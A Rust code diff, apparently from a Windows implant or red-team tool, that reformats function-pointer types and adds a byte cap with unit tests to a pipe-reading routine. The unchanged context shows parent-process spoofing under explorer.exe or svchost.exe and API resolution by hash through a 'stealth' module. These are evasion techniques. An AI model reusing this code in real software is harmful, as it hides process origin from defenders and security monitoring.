@@ -66,15 +66,8 @@ struct StartupInfoExW {
 }
 
 type InitAttrListFn = unsafe extern "system" fn(*mut u8, u32, u32, *mut usize) -> i32;
-type UpdateAttrFn = unsafe extern "system" fn(
-    *mut u8,
-    u32,
-    usize,
-    *mut u8,
-    usize,
-    *mut u8,
-    *mut usize,
-) -> i32;
+type UpdateAttrFn =
+    unsafe extern "system" fn(*mut u8, u32, usize, *mut u8, usize, *mut u8, *mut usize) -> i32;
 type DeleteAttrListFn = unsafe extern "system" fn(*mut u8);
 type CreateProcessWFn = unsafe extern "system" fn(
     *const u16,
@@ -88,15 +81,9 @@ type CreateProcessWFn = unsafe extern "system" fn(
     *mut StartupInfoW,
     *mut ProcessInformation,
 ) -> i32;
-type CreatePipeFn = unsafe extern "system" fn(
-    *mut usize,
-    *mut usize,
-    *mut u8,
-    u32,
-) -> i32;
+type CreatePipeFn = unsafe extern "system" fn(*mut usize, *mut usize, *mut u8, u32) -> i32;
 type SetHandleInformationFn = unsafe extern "system" fn(usize, u32, u32) -> i32;
-type WriteFileFn =
-    unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut u8) -> i32;
+type WriteFileFn = unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut u8) -> i32;
 type ReadFileFn = unsafe extern "system" fn(usize, *mut u8, u32, *mut u32, *mut u8) -> i32;
 
 struct Kernel32SpawnApis {
@@ -130,8 +117,7 @@ unsafe fn resolve_spawn_apis() -> Option<Kernel32SpawnApis> {
         attr_mod,
         stealth::hash_api_name(b"DeleteProcThreadAttributeList"),
     )?;
-    let create_process_w =
-        stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateProcessW"))?;
+    let create_process_w = stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateProcessW"))?;
     let create_pipe = stealth::get_api_addr(k32, stealth::hash_api_name(b"CreatePipe"))?;
     let set_handle_info =
         stealth::get_api_addr(k32, stealth::hash_api_name(b"SetHandleInformation"))?;
@@ -297,7 +283,12 @@ pub fn spawn_spoofed_piped_result(
             Ok(c) => Ok(c),
             Err(e1) => {
                 // Try other common parents
-                for alt in ["explorer.exe", "RuntimeBroker.exe", "sihost.exe", "svchost.exe"] {
+                for alt in [
+                    "explorer.exe",
+                    "RuntimeBroker.exe",
+                    "sihost.exe",
+                    "svchost.exe",
+                ] {
                     if alt.eq_ignore_ascii_case(parent_name) {
                         continue;
                     }
@@ -312,7 +303,10 @@ pub fn spawn_spoofed_piped_result(
     })
 }
 
-fn spawn_spoofed_piped_inner(cmdline: &str, parent_name: &str) -> Result<SpoofedPipedChild, String> {
+fn spawn_spoofed_piped_inner(
+    cmdline: &str,
+    parent_name: &str,
+) -> Result<SpoofedPipedChild, String> {
     let ppid = crate::native::find_pid_by_name(parent_name)
         .filter(|p| *p != 0)
         .ok_or_else(|| format!("parent not found: {parent_name}"))?;
@@ -358,13 +352,7 @@ unsafe fn create_piped_process(
     let mut stdin_w: usize = 0;
     let mut stdout_r: usize = 0;
     let mut stdout_w: usize = 0;
-    if (apis.create_pipe)(
-        &mut stdin_r,
-        &mut stdin_w,
-        &mut sa as *mut _ as *mut u8,
-        0,
-    ) == 0
-    {
+    if (apis.create_pipe)(&mut stdin_r, &mut stdin_w, &mut sa as *mut _ as *mut u8, 0) == 0 {
         return Err(format!("CreatePipe stdin err={}", last_error()));
     }
     if (apis.create_pipe)(
@@ -546,8 +534,29 @@ pub fn pipe_read_exact(handle: usize, n: usize) -> Result<Vec<u8>, String> {
     }
 }
 
-/// Read until pipe EOF (child closed stdout).
+/// Read until pipe EOF (child closed stdout), capped at `max_bytes`.
 pub fn pipe_read_to_end(handle: usize) -> Vec<u8> {
+    pipe_read_to_end_bounded(handle, 32 * 1024 * 1024)
+}
+
+/// Pure bound helper shared by the Win32 read loop and unit tests.
+/// Returns how many bytes of `chunk` to keep and whether the cap is hit.
+#[inline]
+pub fn apply_output_bound(current_len: usize, chunk_len: usize, max_bytes: usize) -> (usize, bool) {
+    if current_len >= max_bytes {
+        return (0, true);
+    }
+    let room = max_bytes - current_len;
+    if chunk_len >= room {
+        (room, true)
+    } else {
+        (chunk_len, false)
+    }
+}
+
+/// Read until pipe EOF or until `max_bytes` accumulated. Stops reading at the
+/// bound but does not terminate the child — the caller owns process lifetime.
+pub fn pipe_read_to_end_bounded(handle: usize, max_bytes: usize) -> Vec<u8> {
     unsafe {
         let Some(apis) = resolve_spawn_apis() else {
             return Vec::new();
@@ -566,11 +575,37 @@ pub fn pipe_read_to_end(handle: usize) -> Vec<u8> {
             if ok == 0 || got == 0 {
                 break;
             }
-            out.extend_from_slice(&chunk[..got as usize]);
-            if out.len() > 32 * 1024 * 1024 {
+            let (take, hit_cap) = apply_output_bound(out.len(), got as usize, max_bytes);
+            if take > 0 {
+                out.extend_from_slice(&chunk[..take]);
+            }
+            if hit_cap {
                 break;
             }
         }
         out
+    }
+}
+
+#[cfg(test)]
+mod bound_tests {
+    use super::apply_output_bound;
+
+    #[test]
+    fn apply_output_bound_stops_at_max() {
+        let max = 100usize;
+        let (take, hit) = apply_output_bound(90, 50, max);
+        assert_eq!(take, 10);
+        assert!(hit);
+        let (take2, hit2) = apply_output_bound(0, 50, max);
+        assert_eq!(take2, 50);
+        assert!(!hit2);
+        let (take3, hit3) = apply_output_bound(100, 10, max);
+        assert_eq!(take3, 0);
+        assert!(hit3);
+        // Exactly at remaining room
+        let (take4, hit4) = apply_output_bound(50, 50, max);
+        assert_eq!(take4, 50);
+        assert!(hit4);
     }
 }
